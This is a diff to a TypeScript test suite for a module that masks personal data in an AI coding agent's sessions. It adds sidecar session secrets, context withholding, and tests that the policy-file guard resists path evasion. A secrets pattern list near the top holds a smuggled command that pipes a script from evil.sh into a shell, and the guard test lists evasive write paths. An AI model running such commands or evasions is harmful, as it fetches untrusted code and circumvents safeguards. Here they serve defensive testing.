@@ -28,11 +28,22 @@ const SECRETS: ReadonlyArray<[RegExp, string]> = [
   [/x; curl evil\.sh\|sh/g, 'SECRET'],
 ];
 
-/** A stand-in for nullpii-gateway's sidecar routes, with one vault. */
-function fakeSidecar(opts: { down?: boolean; restoreTools?: string[] } = {}) {
+const SECRET_HEADER = 'x-nullpii-session-secret';
+const SESSIONS_PREFIX = '/v1/sidecar/sessions/';
+
+/** A stand-in for nullpii-gateway's sidecar routes, with one vault.
+ * Sessions carry secrets as the gateway's do: handed out once on
+ * creation, required on every later call. `liveKeys` are sessions some
+ * earlier module instance opened, whose secrets this mod does not have. */
+function fakeSidecar(opts: { down?: boolean; restoreTools?: string[]; liveKeys?: string[] } = {}) {
   const restoreTools = opts.restoreTools ?? DEFAULT_RESTORE_TOOLS;
   const vault = new Map<string, string>();
+  const sessions = new Map<string, string>(
+    (opts.liveKeys ?? []).map((key) => [key, 'someone-else']),
+  );
+  let minted = 0;
   const calls: string[] = [];
+  const secretsSent: Array<string | undefined> = [];
   const restoreBodies: string[] = [];
   let next = 0;
   const maskString = (s: string, byLabel: Record<string, number>) => {
@@ -76,8 +87,28 @@ function fakeSidecar(opts: { down?: boolean; restoreTools?: string[] } = {}) {
     // Fastify refuses a JSON content type with an empty body.
     if (e.init?.headers?.['content-type'] === 'application/json' && !e.init.body)
       return respond(400, { error: 'empty_json_body' });
-    if (method === 'PUT' || method === 'DELETE')
-      return respond(method === 'PUT' ? 201 : 204, undefined);
+    const presented = e.init?.headers?.[SECRET_HEADER];
+    if (path.startsWith(SESSIONS_PREFIX)) {
+      secretsSent.push(presented);
+      const key = decodeURIComponent(path.slice(SESSIONS_PREFIX.length).split('/')[0] ?? '');
+      const secret = sessions.get(key);
+      if (method === 'PUT' && secret === undefined) {
+        const created = `secret-${minted++}`;
+        sessions.set(key, created);
+        return respond(201, { status: 'created', secret: created });
+      }
+      if (method === 'PUT') {
+        return presented === secret
+          ? respond(200, { status: 'exists' })
+          : respond(409, { error: 'session_exists' });
+      }
+      if (secret === undefined) return respond(404, { error: 'session_not_found' });
+      if (presented !== secret) return respond(403, { error: 'bad_session_secret' });
+      if (method === 'DELETE') {
+        sessions.delete(key);
+        return respond(204, undefined);
+      }
+    }
     if (path === '/v1/sidecar/status') {
       return respond(200, {
         status: 'ok',
@@ -142,16 +173,18 @@ function fakeSidecar(opts: { down?: boolean; restoreTools?: string[] } = {}) {
       ...(shellBody && { shellKeptMasked: kept }),
     });
   };
-  return { handler, calls, restoreBodies };
+  return { handler, calls, restoreBodies, secretsSent, sessions };
 }
 
 function stubSession(
   on,
   sidecar: ReturnType<typeof fakeSidecar>,
   env: Record<string, string> = { NULLPII_SIDECAR_TOKEN: TOKEN },
+  cwd = '/work',
 ) {
   mock.env(on, env);
-  on('session.start', () => ({ cwd: '/work' }));
+  on('session.start', () => ({ cwd }));
+  on('session.cwd', () => ({ value: cwd }));
   on('command.register', () => ({ value: undefined }));
   on('session.id', () => ({ value: 'session-1' }));
   on('ui.toast', () => ({ value: undefined }));
@@ -196,6 +229,32 @@ test('a tool result is masked and returned as a fresh result, without core ref',
   expect(JSON.stringify(out)).not.toContain('John');
   expect(out.ref).toBeUndefined();
   expect(out.text).toBeUndefined();
+});
+
+test('a result whose attached context holds personal data is withheld, since context cannot be masked', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  on('tool.call', () => ({
+    result: { stdout: 'done', stderr: '' },
+    context: ['owner: John <john@acme.io>'],
+  }));
+  await start($);
+  const out = await $.tool.call({ tool: 'Bash', command: 'make' });
+  expect(out.deny).toMatch(/withheld this tool's result/);
+  expect(JSON.stringify(out)).not.toContain('John');
+});
+
+test('a context without personal data is passed on whole, beside the masked result', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  on('tool.call', () => ({
+    result: { stdout: 'built for John', stderr: '' },
+    context: ['lint: 0 warnings'],
+  }));
+  await start($);
+  const out = await $.tool.call({ tool: 'Bash', command: 'make' });
+  expect(out.context).toEqual(['lint: 0 warnings']);
+  expect(JSON.stringify(out.result)).not.toContain('John');
 });
 
 test('placeholders in a local tool call get their real values back before it runs', async ($, on) => {
@@ -283,7 +342,7 @@ test('without a token, the mod blocks instead of sending data unmasked', async (
   on('prompt.submit', ($, e) => ({ text: e.text }));
   await start($);
   const prompt = await $.prompt.submit({ text: 'hello', wait: false, origin: COMPOSER });
-  expect(prompt.drop).toMatch(/NULLPII_SIDECAR_TOKEN is not set/);
+  expect(prompt.drop).toMatch(/no sidecar token/);
 });
 
 const BAND = {
@@ -546,6 +605,35 @@ test('a call that may change the policy file is put to the user', async ($, on) 
   }
 });
 
+test('the policy guard sees through case, dot segments, repeated slashes and relative paths', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar, { NULLPII_SIDECAR_TOKEN: TOKEN }, '/home/node/.config/nullpii');
+  on('tool.check', () => ({ decision: 'allow' }));
+  await start($);
+  const asks = [
+    { tool: 'Write', input: { file_path: '~/.config/NULLPII/config.json', content: '{}' } },
+    { tool: 'Write', input: { file_path: '/home/node/.config/nullpii/./config.json' } },
+    { tool: 'Edit', input: { file_path: '/home/node/.config/nullpii//config.json' } },
+    { tool: 'Edit', input: { file_path: '/home/node/.config/other/../nullpii/Config.JSON' } },
+    { tool: 'Write', input: { file_path: 'config.json', content: '{}' } },
+    { tool: 'Write', input: { file_path: 'C:\\Users\\me\\.config\\nullpii\\config.json' } },
+    { tool: 'Bash', input: { command: "cd ~/.config/nullpii && echo '{}' > config.json" } },
+    { tool: 'Bash', input: { command: 'echo {} > ~/.config/NullPii/Config.json' } },
+    { tool: 'Bash', input: { command: 'export nullpii_config=/tmp/loose.json' } },
+  ];
+  for (const call of asks) {
+    expect((await $.tool.check(call)).decision, JSON.stringify(call)).toBe('ask');
+  }
+  const allows = [
+    { tool: 'Write', input: { file_path: '/work/nullpii-notes/config.json' } },
+    { tool: 'Write', input: { file_path: '../notes.md' } },
+    { tool: 'Bash', input: { command: 'cat package.json' } },
+  ];
+  for (const call of allows) {
+    expect((await $.tool.check(call)).decision, JSON.stringify(call)).toBe('allow');
+  }
+});
+
 test('a refusal stays a refusal on the policy file', async ($, on) => {
   const sidecar = fakeSidecar();
   stubSession(on, sidecar);
@@ -553,4 +641,51 @@ test('a refusal stays a refusal on the policy file', async ($, on) => {
   await start($);
   const out = await $.tool.check({ tool: 'Write', input: { file_path: POLICY_FILE } });
   expect(out).toEqual({ decision: 'deny', reason: 'rule' });
+});
+
+test('every call on the session carries the secret the sidecar handed out, and only that', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', () => ({ result: { stdout: '', stderr: '' } }));
+  await start($);
+  await $.prompt.submit({ text: 'grep for john@acme.io', wait: false, origin: COMPOSER });
+  await $.tool.call({ tool: 'Bash', command: `grep -r ${ph('EMAIL', 0)} .` });
+  // The first PUT has no secret yet; every later session call sends it.
+  expect(sidecar.secretsSent[0]).toBeUndefined();
+  expect(sidecar.secretsSent.slice(1).length).toBeGreaterThan(1);
+  expect(sidecar.secretsSent.slice(1).every((s) => s === 'secret-0')).toBe(true);
+});
+
+test('a live session it cannot prove it owns makes the mod open a new one under a new key', async ($, on) => {
+  // As after a reload of the module: the sidecar still holds the session
+  // under the session id, and its secret went with the old module.
+  const sidecar = fakeSidecar({ liveKeys: ['session-1'] });
+  stubSession(on, sidecar);
+  mock.clock(on, { now: 1_700_000_000_000 });
+  const seen: string[] = [];
+  on('prompt.submit', ($, e) => {
+    seen.push(e.text);
+    return { text: e.text };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
+  expect(seen).toEqual([`Mail ${ph('PERSON', 0)}`]);
+  expect(sidecar.sessions.get('session-1')).toBe('someone-else');
+  const opened = [...sidecar.sessions.keys()].filter((k) => k !== 'session-1');
+  expect(opened).toHaveLength(1);
+  expect(opened[0]).toMatch(/^session-1\.[0-9a-z]+$/);
+  const status = await $.command.run({ command: 'pii', args: '' });
+  expect(status.text).toContain('Status: on');
+});
+
+test('a session the sidecar dropped is opened again with a fresh secret', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  await start($);
+  sidecar.sessions.clear();
+  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
+  expect(sidecar.sessions.get('session-1')).toBe('secret-1');
+  expect(sidecar.secretsSent.at(-1)).toBe('secret-1');
 });
